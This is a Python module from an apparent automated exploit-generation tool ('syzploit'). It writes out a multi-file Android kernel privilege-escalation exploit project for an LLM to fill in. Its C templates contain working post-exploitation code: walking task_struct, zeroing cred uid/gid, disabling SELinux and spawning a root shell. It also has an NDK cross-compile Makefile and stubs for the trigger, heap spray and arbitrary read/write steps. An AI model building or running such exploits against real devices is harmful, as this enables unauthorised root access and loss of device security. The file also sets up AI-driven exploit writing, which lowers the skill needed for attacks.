"""
exploit.scaffold — Multi-file exploit project scaffolding.

Real kernel exploits are multi-file projects (500–1500+ lines across 4–8 files)
with Makefiles for NDK cross-compilation.  This module generates a project
directory structure so the LLM can fill each file independently (smaller
context window, better output quality).

Patterns from kernel_PoCs:
  - badnode:   exploit.c, exploit.h, binder_client.c/h, token_manager.c/h,
               util.c/h, Makefile
  - badspin:   exploit.c, vuln.c, root.c, rw.c, uao.c, ksym.c, sepolicy.c,
               unix.c, dev_config.h, kernel_constants.h, Makefile
  - common/:   exploit_entry.h, root_payload.h
"""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any, Dict, List, Optional

from ..core.config import Config, load_config
from ..core.log import console


# ═════════════════════════════════════════════════════════════════════
# File templates
# ═════════════════════════════════════════════════════════════════════

_MAKEFILE_NDK = """\
# Makefile for Android kernel exploit (NDK cross-compilation)
#
# Usage:  make                (builds for arm64)
#         make ARCH=x86_64    (builds for x86_64)
#         make clean
#
# Requires: ANDROID_NDK_HOME set, or aarch64-linux-gnu-gcc / clang

ARCH       ?= arm64
TARGET     ?= exploit
SRCS       := $(wildcard *.c)
OBJS       := $(SRCS:.c=.o)

ifeq ($(ARCH),arm64)
  CC       ?= aarch64-linux-gnu-gcc
  CFLAGS   += -march=armv8-a
else ifeq ($(ARCH),x86_64)
  CC       ?= x86_64-linux-gnu-gcc
  CFLAGS   += -m64
else
  CC       ?= gcc
endif

CFLAGS     += -static -O2 -Wall -Wno-unused-function -Wno-unused-variable
CFLAGS     += -DTARGET_ARCH_$(ARCH)
LDFLAGS    += -static -lpthread

.PHONY: all clean

all: $(TARGET)

$(TARGET): $(OBJS)
\t$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

%.o: %.c
\t$(CC) $(CFLAGS) -c -o $@ $<

clean:
\trm -f $(TARGET) $(OBJS)
"""

_EXPLOIT_H = """\
#ifndef EXPLOIT_H
#define EXPLOIT_H

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>

/* ── Kernel offsets (generated by syzploit resolve_kernel_offsets) ── */
#include "kernel_offsets.h"

/* ── Exploit context shared between modules ─────────────────────── */
typedef struct {{
    /* Kernel base (after KASLR bypass) */
    uint64_t kernel_base;

    /* Arbitrary read/write function pointers (set by rw_primitive module) */
    uint64_t (*kread64)(uint64_t addr);
    void (*kwrite64)(uint64_t addr, uint64_t val);

    /* Target-specific state */
    uint64_t target_object_addr;
    uint64_t task_addr;         /* our task_struct address */
    uint64_t cred_addr;         /* our cred struct address */

    /* Spray state */
    int spray_fds[4096];
    int spray_count;
}} exploit_ctx_t;

/* ── Module entry points ────────────────────────────────────────── */

/* trigger.c — vulnerability trigger */
int trigger_vuln(exploit_ctx_t *ctx);

/* spray.c — heap spray / object reclamation */
int do_heap_spray(exploit_ctx_t *ctx);

/* rw_primitive.c — establish arbitrary R/W */
int setup_rw_primitive(exploit_ctx_t *ctx);

/* post_exploit.c — privilege escalation + verification */
int do_post_exploit(exploit_ctx_t *ctx);

/* util.c — common helpers */
void hexdump(const void *data, size_t len);
int pin_to_cpu(int cpu);
void set_exploit_name(void);

#endif /* EXPLOIT_H */
"""

_MAIN_C = """\
/* main.c — exploit orchestrator
 *
 * Coordinates the exploit pipeline:
 *   1. trigger_vuln()      — trigger the vulnerability
 *   2. do_heap_spray()     — reclaim freed object with controlled data
 *   3. setup_rw_primitive() — establish arbitrary kernel R/W
 *   4. do_post_exploit()   — walk tasks, overwrite cred, verify UID
 */
#include "exploit.h"
#include <sys/prctl.h>

int main(int argc, char **argv) {{
    printf("SYZPLOIT_UID_BEFORE=%d\\n", getuid());
    fflush(stdout);

    /* Set unique name for task list matching */
    prctl(PR_SET_NAME, "syzploit_exp", 0, 0, 0);

    exploit_ctx_t ctx = {{0}};

    printf("[*] Step 1: Triggering vulnerability...\\n");
    if (trigger_vuln(&ctx) != 0) {{
        printf("[-] Trigger failed\\n");
        return 1;
    }}
    printf("[+] Vulnerability triggered\\n");

    printf("[*] Step 2: Heap spray / object reclamation...\\n");
    if (do_heap_spray(&ctx) != 0) {{
        printf("[-] Heap spray failed\\n");
        return 1;
    }}
    printf("[+] Object reclaimed\\n");

    printf("[*] Step 3: Setting up arb R/W primitive...\\n");
    if (setup_rw_primitive(&ctx) != 0) {{
        printf("[-] R/W primitive setup failed\\n");
        return 1;
    }}
    printf("[+] R/W primitive ready\\n");

    printf("[*] Step 4: Post-exploitation...\\n");
    if (do_post_exploit(&ctx) != 0) {{
        printf("[-] Post-exploit failed\\n");
        return 1;
    }}

    /* Validate & report */
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    printf("SYZPLOIT_UID_AFTER=%d\\n", getuid());
    fflush(stdout);

    if (getuid() == 0) {{
        printf("[+] SUCCESS: privilege escalation confirmed! UID=0\\n");
        execl("/bin/sh", "sh", NULL);
    }} else {{
        printf("[-] Privilege escalation failed. UID=%d\\n", getuid());
    }}
    return 1;
}}
"""

_TRIGGER_C = """\
/* trigger.c — vulnerability trigger
 *
 * TODO: Implement the vulnerability trigger for {cve_id}.
 * This should corrupt a kernel object or create a dangling reference.
 */
#include "exploit.h"

int trigger_vuln(exploit_ctx_t *ctx) {{
    printf("[trigger] TODO: implement vulnerability trigger\\n");
    /* Example for UAF:
     *   1. Open the vulnerable device/syscall
     *   2. Create the target object
     *   3. Trigger the bug (race, bad input, etc.)
     *   4. Object is now freed but still referenced
     */
    return -1;  /* TODO: return 0 on success */
}}
"""

_SPRAY_C = """\
/* spray.c — heap spray / object reclamation
 *
 * After trigger.c frees the target object, spray the same slab cache
 * to reclaim the freed slot with attacker-controlled data.
 */
#include "exploit.h"

int do_heap_spray(exploit_ctx_t *ctx) {{
    printf("[spray] TODO: implement heap spray\\n");
    /* Example for kmalloc-128:
     *   - sendmsg cmsg spray
     *   - msgsnd msg_msg spray
     *   - epoll_ctl epitem spray
     *   See primitive_library.py for templates
     */
    return -1;  /* TODO: return 0 on success */
}}
"""

_RW_PRIM_C = """\
/* rw_primitive.c — establish arbitrary kernel R/W
 *
 * After reclaiming the freed object with controlled data, build a
 * stable read/write primitive (e.g. pipe_buffer corruption).
 */
#include "exploit.h"

/* These will be set by setup_rw_primitive and used by post_exploit */
static uint64_t _kread64(uint64_t addr) {{
    /* TODO: implement using your corruption primitive */
    (void)addr;
    return 0;
}}

static void _kwrite64(uint64_t addr, uint64_t val) {{
    /* TODO: implement using your corruption primitive */
    (void)addr; (void)val;
}}

int setup_rw_primitive(exploit_ctx_t *ctx) {{
    printf("[rw] TODO: implement R/W primitive\\n");
    /* After implementation, register the functions: */
    ctx->kread64 = _kread64;
    ctx->kwrite64 = _kwrite64;
    return -1;  /* TODO: return 0 on success */
}}
"""

_POST_EXPLOIT_C = """\
/* post_exploit.c — privilege escalation + verification
 *
 * Given kread64/kwrite64 from the R/W primitive:
 *   1. Bypass KASLR (leak kernel base from pipe_buffer.ops or similar)
 *   2. Walk task list from init_task to find our task_struct
 *   3. Zero cred uid/gid fields
 *   4. Disable SELinux (Android)
 */
#include "exploit.h"
#include <sys/prctl.h>

int do_post_exploit(exploit_ctx_t *ctx) {{
    if (!ctx->kread64 || !ctx->kwrite64) {{
        printf("[-] R/W primitive not available\\n");
        return -1;
    }}

    /* 1. KASLR bypass (if kernel_base not already known) */
    if (ctx->kernel_base == 0) {{
        printf("[post] TODO: KASLR bypass\\n");
        return -1;
    }}

    /* 2. Walk task list to find our task_struct */
    uint64_t init_task = ctx->kernel_base + INIT_TASK_OFFSET;
    pid_t my_pid = getpid();
    uint64_t task = init_task;

    for (int i = 0; i < 4096; i++) {{
        uint64_t next = ctx->kread64(task + TASK_STRUCT_TASKS_OFFSET);
        task = next - TASK_STRUCT_TASKS_OFFSET;
        if (task == init_task) break;

        pid_t pid = (pid_t)ctx->kread64(task + TASK_STRUCT_PID_OFFSET);
        if (pid == my_pid) {{
            ctx->task_addr = task;
            printf("[+] Found our task at 0x%lx\\n", task);
            break;
        }}
    }}
    if (!ctx->task_addr) {{
        printf("[-] Could not find our task_struct\\n");
        return -1;
    }}

    /* 3. Zero cred uid/gid */
    ctx->cred_addr = ctx->kread64(ctx->task_addr + TASK_STRUCT_CRED_OFFSET);
    if (!ctx->cred_addr) {{
        printf("[-] cred pointer is NULL\\n");
        return -1;
    }}
    ctx->kwrite64(ctx->cred_addr + 4,  0);  /* uid, gid */
    ctx->kwrite64(ctx->cred_addr + 12, 0);  /* suid, sgid */
    ctx->kwrite64(ctx->cred_addr + 20, 0);  /* euid, egid */
    ctx->kwrite64(ctx->cred_addr + 28, 0);  /* fsuid, fsgid */
    printf("[+] Cred uid/gid zeroed\\n");

    /* 4. Disable SELinux (Android) */
#ifdef SELINUX_STATE_OFFSET
    uint64_t se_addr = ctx->kernel_base + SELINUX_STATE_OFFSET;
    ctx->kwrite64(se_addr, 0);
    printf("[+] SELinux disabled\\n");
#endif

    return 0;
}}
"""

_UTIL_C = """\
/* util.c — common exploit utilities */
#include "exploit.h"
#include <sched.h>

void hexdump(const void *data, size_t len) {{
    const uint8_t *p = (const uint8_t *)data;
    for (size_t i = 0; i < len; i += 16) {{
        printf("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i+j < len; j++)
            printf("%02x ", p[i+j]);
        printf("\\n");
    }}
}}

int pin_to_cpu(int cpu) {{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}}

void set_exploit_name(void) {{
    #include <sys/prctl.h>
    prctl(PR_SET_NAME, "syzploit_exp", 0, 0, 0);
}}
"""

_KERNEL_OFFSETS_H = """\
#ifndef KERNEL_OFFSETS_H
#define KERNEL_OFFSETS_H

/* ── Kernel offsets — generated by syzploit resolve_kernel_offsets ──
 * These MUST be filled in for the target kernel.  Run:
 *   syzploit resolve_kernel_offsets --vmlinux <path>
 * to generate correct values.
 */

/* kernel base offsets (relative to _stext / kernel base) */
#define INIT_TASK_OFFSET          0x0  /* TODO: resolve */
#define ANON_PIPE_BUF_OPS_OFFSET  0x0  /* TODO: resolve */
#define SELINUX_STATE_OFFSET      0x0  /* TODO: resolve */

/* task_struct field offsets */
#define TASK_STRUCT_TASKS_OFFSET  0x0  /* TODO: resolve */
#define TASK_STRUCT_PID_OFFSET    0x0  /* TODO: resolve */
#define TASK_STRUCT_COMM_OFFSET   0x0  /* TODO: resolve */
#define TASK_STRUCT_CRED_OFFSET   0x0  /* TODO: resolve */
#define TASK_STRUCT_RCRED_OFFSET  0x0  /* TODO: resolve */

/* cred struct field offsets */
#define CRED_UID_OFFSET           4
#define CRED_GID_OFFSET           8
#define CRED_SUID_OFFSET          12
#define CRED_SGID_OFFSET          16
#define CRED_EUID_OFFSET          20
#define CRED_EGID_OFFSET          24
#define CRED_FSUID_OFFSET         28
#define CRED_FSGID_OFFSET         32

/* memory layout */
#define VMEMMAP_START     0xfffffc0000000000ULL
#define PAGE_OFFSET       0xffffff8000000000ULL

#endif /* KERNEL_OFFSETS_H */
"""


# ═════════════════════════════════════════════════════════════════════
# Scaffolding generator
# ═════════════════════════════════════════════════════════════════════

class ExploitScaffold:
    """Generate a multi-file exploit project directory."""

    def __init__(
        self,
        output_dir: str,
        cve_id: str = "CVE-XXXX-XXXXX",
        arch: str = "arm64",
        platform: str = "android",
    ) -> None:
        self.output_dir = Path(output_dir)
        self.cve_id = cve_id
        self.arch = arch
        self.platform = platform

    def generate(self) -> Dict[str, str]:
        """Generate the scaffold and return {filename: content} mapping."""
        files: Dict[str, str] = {
            "Makefile": _MAKEFILE_NDK,
            "exploit.h": _EXPLOIT_H,
            "main.c": _MAIN_C,
            "trigger.c": _TRIGGER_C.format(cve_id=self.cve_id),
            "spray.c": _SPRAY_C,
            "rw_primitive.c": _RW_PRIM_C,
            "post_exploit.c": _POST_EXPLOIT_C,
            "util.c": _UTIL_C,
            "kernel_offsets.h": _KERNEL_OFFSETS_H,
        }
        return files

    def write(self) -> List[str]:
        """Write scaffold files to output_dir. Returns list of created paths."""
        self.output_dir.mkdir(parents=True, exist_ok=True)
        files = self.generate()
        created = []
        for name, content in files.items():
            path = self.output_dir / name
            path.write_text(content)
            created.append(str(path))
        console.print(
            f"  [dim]Scaffold: {len(created)} files → {self.output_dir}[/]"
        )
        return created

    def format_for_prompt(self) -> str:
        """Describe the scaffold structure for LLM prompt context."""
        return (
            "=== Multi-File Exploit Scaffold ===\n"
            "The exploit is split into focused modules:\n"
            "  main.c           — orchestrator (calls each step)\n"
            "  trigger.c        — vulnerability trigger\n"
            "  spray.c          — heap spray / object reclamation\n"
            "  rw_primitive.c   — arbitrary R/W primitive setup\n"
            "  post_exploit.c   — task walk, cred overwrite, SELinux\n"
            "  util.c           — helpers (hexdump, pin_to_cpu)\n"
            "  exploit.h        — shared context struct + function decls\n"
            "  kernel_offsets.h — kernel-specific addresses/offsets\n"
            "  Makefile         — NDK cross-compilation\n\n"
            "Each file should be under 300 lines. Fill in the TODO sections.\n"
            "The exploit_ctx_t struct is shared between all modules.\n"
        )
